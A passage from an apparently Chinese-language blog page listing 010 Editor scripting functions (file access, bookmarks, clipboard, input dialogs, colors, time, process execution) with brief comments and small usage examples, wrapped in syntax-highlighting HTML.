class="params">pos</span>, <span class="params">short</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteUByte( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">uchar</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteUInt( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">uint</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteUInt64( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">uint64</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteUQuad( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">uint64</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteUShort( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">ushort</span> <span class="params">value</span> )</span>  </span><br><span class="line">void <span class="constructor">WriteBytes( <span class="params">const</span> <span class="params">uchar</span> <span class="params">buffer</span>[], <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">n</span> )</span>  </span><br><span class="line">void <span class="constructor">WriteString( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">const</span> <span class="params">char</span> <span class="params">value</span>[] )</span>  </span><br><span class="line">void <span class="constructor">WriteWString( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">const</span> <span class="params">wstring</span> <span class="params">value</span> )</span>  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">DirectoryExists( <span class="params">string</span> <span class="params">dir</span> )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">MakeDir( <span class="params">string</span> <span class="params">dir</span> )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">FEof()</span>  </span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">FileSize()</span>  </span><br><span class="line">TFileList <span class="constructor">FindFiles( <span class="params">string</span> <span class="params">dir</span>, <span class="params">string</span> <span class="params">filter</span> )</span>  </span><br><span class="line">    TFileList fl = <span class="constructor">FindFiles( <span class="string">"C:\\temp\\"</span>, <span class="string">"*.zip"</span> )</span>;  </span><br><span class="line">    <span class="built_in">int</span> i;  </span><br><span class="line">    <span class="constructor">Printf( <span class="string">"Num files = %d\n"</span>, <span class="params">fl</span>.<span class="params">filecount</span> )</span>;  </span><br><span class="line">    for( i = <span class="number">0</span>; i &lt; fl.filecount; i++ )  </span><br><span class="line">    &#123;  </span><br><span class="line">    <span class="constructor">Printf( <span class="string">" %s\n"</span>, <span class="params">fl</span>.<span class="params">file</span>[<span class="params">i</span>].<span class="params">filename</span> )</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="constructor">Printf( <span class="string">"\n"</span> )</span>;  </span><br><span class="line">    <span class="constructor">Printf( <span class="string">"Num dirs = %d\n"</span>, <span class="params">fl</span>.<span class="params">dircount</span> )</span>;  </span><br><span class="line">    for( i = <span class="number">0</span>; i &lt; fl.dircount; i++ )  </span><br><span class="line">    &#123;  </span><br><span class="line">    <span class="constructor">Printf( <span class="string">" %s\n"</span>, <span class="params">fl</span>.<span class="params">dir</span>[<span class="params">i</span>].<span class="params">dirname</span> )</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">FPrintf( <span class="params">int</span> <span class="params">fileNum</span>, <span class="params">char</span> <span class="params">format</span>[], <span class="operator">...</span> )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">FSeek( <span class="params">int64</span> <span class="params">pos</span> )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">FSkip( <span class="params">int64</span> <span class="params">offset</span> )</span>  </span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">FTell()</span>  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">TextAddressToLine( <span class="params">int64</span> <span class="params">address</span> )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">TextAddressToColumn( <span class="params">int64</span> <span class="params">address</span> )</span>  </span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">TextColumnToAddress( <span class="params">int64</span> <span class="params">line</span>, <span class="params">int</span> <span class="params">column</span> )</span>  </span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">TextGetNumLines()</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">TextGetLineSize( <span class="params">int64</span> <span class="params">line</span>, <span class="params">int</span> <span class="params">includeLinefeeds</span>=<span class="params">true</span> )</span>  </span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">TextLineToAddress( <span class="params">int64</span> <span class="params">line</span> )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">TextReadLine( <span class="params">char</span> <span class="params">buffer</span>[], <span class="params">int64</span> <span class="params">line</span>, <span class="params">int</span> <span class="params">maxsize</span>, <span class="params">int</span> <span class="params">includeLinefeeds</span>=<span class="params">true</span> )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">TextReadLineW( <span class="params">wchar_t</span> <span class="params">buffer</span>[], <span class="params">int64</span> <span class="params">line</span>, <span class="params">int</span> <span class="params">maxsize</span>, <span class="params">int</span> <span class="params">includeLinefeeds</span>=<span class="params">true</span> )</span>  </span><br><span class="line">void <span class="constructor">TextWriteLineW( <span class="params">const</span> <span class="params">wchar_t</span> <span class="params">buffer</span>[], <span class="params">int64</span> <span class="params">line</span>, <span class="params">int</span> <span class="params">includeLinefeeds</span>=<span class="params">true</span> )</span>  </span><br><span class="line">void <span class="constructor">TextWriteLine( <span class="params">const</span> <span class="params">char</span> <span class="params">buffer</span>[], <span class="params">int64</span> <span class="params">line</span>, <span class="params">int</span> <span class="params">includeLinefeeds</span>=<span class="params">true</span> )</span></span><br></pre></td></tr></table></figure>

<p>其他函数</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="comment">//书签  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddBookmark</span>(<span class="params"> int64 pos, <span class="keyword">string</span> name, <span class="keyword">string</span> typename, <span class="keyword">int</span> arraySize=<span class="number">-1</span>, <span class="keyword">int</span> forecolor=cNone, <span class="keyword">int</span> backcolor=<span class="number">0xffffc4</span>, <span class="keyword">int</span> moveWithCursor=<span class="literal">false</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="title">AddBookmark</span>(<span class="params"> GetCursorPos(</span>), "endmarker","ZIPENDLOCATOR", -1, cRed )</span>;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetBookmarkArraySize</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetBookmarkBackColor</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetBookmarkForeColor</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetBookmarkMoveWithCursor</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">string</span> <span class="title">GetBookmarkName</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function">int64 <span class="title">GetBookmarkPos</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">string</span> <span class="title">GetBookmarkType</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetNumBookmarks</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RemoveBookmark</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function"><span class="comment">//断言  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Assert</span>(<span class="params"> <span class="keyword">int</span> <span class="keyword">value</span>, <span class="keyword">const</span> <span class="keyword">char</span> msg[] = <span class="string">""</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="title">Assert</span>(<span class="params"> numRecords &gt; <span class="number">10</span>,<span class="string">"numRecords should be more than 10."</span> </span>)</span>;  </span><br><span class="line"><span class="comment">//剪贴板  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearClipboard</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CopyBytesToClipboard</span>(<span class="params"> uchar buffer[], <span class="keyword">int</span> size, <span class="keyword">int</span> charset=CHARSET_ANSI, <span class="keyword">int</span> bigendian=<span class="literal">false</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CopyStringToClipboard</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> str[], <span class="keyword">int</span> charset=CHARSET_ANSI </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CopyToClipboard</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CutToClipboard</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetClipboardBytes</span>(<span class="params"> uchar buffer[], <span class="keyword">int</span> maxBytes </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetClipboardIndex</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">string</span> <span class="title">GetClipboardString</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PasteFromClipboard</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetClipboardIndex</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">文件  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DeleteFile</span>(<span class="params"> <span class="keyword">char</span> filename[] </span>)    <span class="comment">//删除文件，文件不能在编辑器中打开  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FileClose</span>(<span class="params"></span>)<span class="comment">//关闭当前文件  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileCount</span>(<span class="params"></span>)<span class="comment">//获取editor打开的文件数  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileExists</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[] </span>)<span class="comment">//检测文件存在  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileNew</span>(<span class="params"> <span class="keyword">char</span> <span class="keyword">interface</span>[]=<span class="string">""</span>, <span class="keyword">int</span> makeActive=<span class="literal">true</span> </span>)<span class="comment">//创建爱你文件  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileOpen</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[], <span class="keyword">int</span> runTemplate=<span class="literal">false</span>, <span class="keyword">char</span> <span class="keyword">interface</span>[]=<span class="string">""</span>, <span class="keyword">int</span> openDuplicate=<span class="literal">false</span> </span>)<span class="comment">//打开文件  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileSave</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileSave</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[] </span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileSave</span>(<span class="params"> <span class="keyword">const</span> wchar_t filename[] </span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileSaveRange</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[], int64 start, int64 size </span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileSaveRange</span>(<span class="params"> <span class="keyword">const</span> wchar_t filename[], int64 start, int64 size </span>)<span class="comment">//保存文件  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FileSelect</span>(<span class="params"> <span class="keyword">int</span> index </span>)<span class="comment">//选择读写的文件  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FindOpenFile</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> path[] </span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FindOpenFileW</span>(<span class="params"> <span class="keyword">const</span> wchar_t path[] </span>)<span class="comment">//查找并打开文件  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetFileAttributesUnix</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetFileAttributesWin</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetFileAttributesUnix</span>(<span class="params"> <span class="keyword">int</span> attributes </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetFileAttributesWin</span>(<span class="params"> <span class="keyword">int</span> attributes </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetFileCharSet</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetFileInterface</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetFileInterface</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> name[] </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetFileName</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">wchar_t[] <span class="title">GetFileNameW</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetFileNum</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetReadOnly</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetReadOnly</span>(<span class="params"> <span class="keyword">int</span> <span class="keyword">readonly</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">string</span> <span class="title">GetTempDirectory</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetTempFileName</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetTemplateName</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function">wchar_t[] <span class="title">GetTemplateNameW</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetTemplateFileName</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function">wchar_t[] <span class="title">GetTemplateFileNameW</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetScriptName</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function">wchar_t[] <span class="title">GetScriptNameW</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetScriptFileName</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function">wchar_t[] <span class="title">GetScriptFileNameW</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetWorkingDirectory</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function">wchar_t[] <span class="title">GetWorkingDirectoryW</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">RenameFile</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> originalname[], <span class="keyword">const</span> <span class="keyword">char</span> newname[] </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RequiresFile</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RequiresVersion</span>(<span class="params"> <span class="keyword">int</span> majorVer, <span class="keyword">int</span> minorVer=<span class="number">0</span>, <span class="keyword">int</span> revision=<span class="number">0</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RunTemplate</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[]=<span class="string">""</span>, <span class="keyword">int</span> clearOutput=<span class="literal">false</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetWorkingDirectory</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> dir[] </span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetWorkingDirectoryW</span>(<span class="params"> <span class="keyword">const</span> wchar_t dir[] </span>)  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function"><span class="comment">//输入  </span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">InputDirectory</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> title[], <span class="keyword">const</span> <span class="keyword">char</span> defaultDir[]=<span class="string">""</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">InputFloat</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> title[], <span class="keyword">const</span> <span class="keyword">char</span> caption[], <span class="keyword">const</span> <span class="keyword">char</span> defaultValue[] </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InputNumber</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> title[], <span class="keyword">const</span> <span class="keyword">char</span> caption[], <span class="keyword">const</span> <span class="keyword">char</span> defaultValue[] </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">InputOpenFileName</span>(<span class="params"> <span class="keyword">char</span> title[], <span class="keyword">char</span> filter[]=<span class="string">"All files (*.*)"</span>, <span class="keyword">char</span> filename[]=<span class="string">""</span> </span>)  </span></span><br><span class="line"><span class="function">TOpenFileNames <span class="title">InputOpenFileNames</span>(<span class="params"> <span class="keyword">char</span> title[], <span class="keyword">char</span> filter[]=<span class="string">"All files (*.*)"</span>, <span class="keyword">char</span> filename[]=<span class="string">""</span> </span>)  </span></span><br><span class="line"><span class="function">    <span class="keyword">int</span> i</span>;  </span><br><span class="line">    TOpenFileNames f = InputOpenFileNames(  </span><br><span class="line">    <span class="string">"Open File Test"</span>,  </span><br><span class="line">    <span class="string">"C Files (*.c *.cpp)|All Files (*.*)"</span> );  </span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; f.count; i++ )  </span><br><span class="line">    Printf( <span class="string">"%s\n"</span>, f.file[i].filename );  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InputRadioButtonBox</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> title[], <span class="keyword">const</span> <span class="keyword">char</span> caption[], <span class="keyword">int</span> defaultIndex, <span class="keyword">const</span> <span class="keyword">char</span> str1[], <span class="keyword">const</span> <span class="keyword">char</span> str2[], <span class="keyword">const</span> <span class="keyword">char</span> str3[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str4[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str5[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str6[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str7[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str8[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str9[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str10[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str11[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str12[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str13[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str14[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str15[]=<span class="string">""</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">InputSaveFileName</span>(<span class="params"> <span class="keyword">char</span> title[], <span class="keyword">char</span> filter[]=<span class="string">"All files (*.*)"</span>, <span class="keyword">char</span> filename[]=<span class="string">""</span>, <span class="keyword">char</span> extension[]=<span class="string">""</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">InputString</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> title[], <span class="keyword">const</span> <span class="keyword">char</span> caption[], <span class="keyword">const</span> <span class="keyword">char</span> defaultValue[] </span>)  </span></span><br><span class="line"><span class="function">wstring <span class="title">InputWString</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> title[], <span class="keyword">const</span> <span class="keyword">char</span> caption[], <span class="keyword">const</span> wstring defaultValue </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InsertFile</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[], int64 position </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsEditorFocused</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsModified</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsNoUIMode</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MessageBox</span>(<span class="params"> <span class="keyword">int</span> mask, <span class="keyword">const</span> <span class="keyword">char</span> title[], <span class="keyword">const</span> <span class="keyword">char</span> format[] [, argument, ... ] </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OutputPaneClear</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">OutputPaneSave</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[] </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OutputPaneCopy</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Printf</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> format[] [, argument, ... ] </span>)  </span></span><br><span class="line"><span class="function">    <span class="title">Printf</span>(<span class="params"> <span class="string">"Num = %d, Float = %lf, Str = '%s'\n"</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="string">"Test"</span> </span>)</span>;  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StatusMessage</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> format[] [, argument, ... ] </span>)  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">int64 <span class="title">GetSelSize</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">int64 <span class="title">GetSelStart</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetSelection</span>(<span class="params"> int64 start, int64 size </span>)  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function"><span class="comment">//颜色  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetForeColor</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetBackColor</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetBackColor</span>(<span class="params"> <span class="keyword">int</span> color </span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetColor</span>(<span class="params"> <span class="keyword">int</span> forecolor, <span class="keyword">int</span> backcolor </span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetForeColor</span>(<span class="params"> <span class="keyword">int</span> color </span>)  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetBytesPerLine</span>(<span class="params"></span>)<span class="comment">//获取显示列数  </span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function"><span class="comment">//时间  </span></span></span><br><span class="line"><span class="function"><span class="keyword">string</span> <span class="title">GetCurrentTime</span>(<span class="params"> <span class="keyword">char</span> format[] = <span class="string">"hh:mm:ss"</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">string</span> <span class="title">GetCurrentDate</span>(<span class="params"> <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy"</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">string</span> <span class="title">GetCurrentDateTime</span>(<span class="params"> <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy hh:mm:ss"</span> </span>)  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisableUndo</span>(<span class="params"></span>)<span class="comment">//禁止undo  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnableUndo</span>(<span class="params"></span>)<span class="comment">//允许undo  </span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function"><span class="comment">//设置显示值  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayFormatBinary</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayFormatDecimal</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayFormatHex</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayFormatOctal</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Exec</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> program[], <span class="keyword">const</span> <span class="keyword">char</span> arguments[], <span class="keyword">int</span> wait=<span class="literal">false</span> </span>) <span class="keyword">int</span> <span class="title">Exec</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> program[], <span class="keyword">const</span> <span class="keyword">char</span> arguments[], <span class="keyword">int</span> wait, <span class="keyword">int</span> &amp;errorCode </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Exit</span>(<span class="params"> <span class="keyword">int</span> errorcode </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Warning</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> format[] [, argument, ... ] </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Terminate</span>(<span class="params"> <span class="keyword">int</span> force=<span class="literal">true</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetArg</span>(<span class="params"> <span class="keyword">int</span> index </span>) wchar_t[] <span class="title">GetArgW</span>(<span class="params"> <span class="keyword">int</span> index </span>)<span class="comment">//获取传递给脚本的命令  </span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetEnv</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> str[] </span>)<span class="comment">//获取环境变量  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetEnv</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> str[], <span class="keyword">const</span> <span class="keyword">char</span> <span class="keyword">value</span>[] </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetNumArgs</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExpandAll</span>(<span class="params"></span>)<span class="comment">//展开节点  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExportCSV</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[] </span>)<span class="comment">//导出  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExportXML</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[] </span>)<span class="comment">//导出  </span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">int64 <span class="title">GetCursorPos</span>(<span class="params"></span>)<span class="comment">//获取当前指针  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetCursorPos</span>(<span class="params"> int64 pos </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sleep</span>(<span class="params"> <span class="keyword">int</span> milliseconds </span>)</span></span><br></pre></td></tr></table></figure>

<p>字符串函数</p>
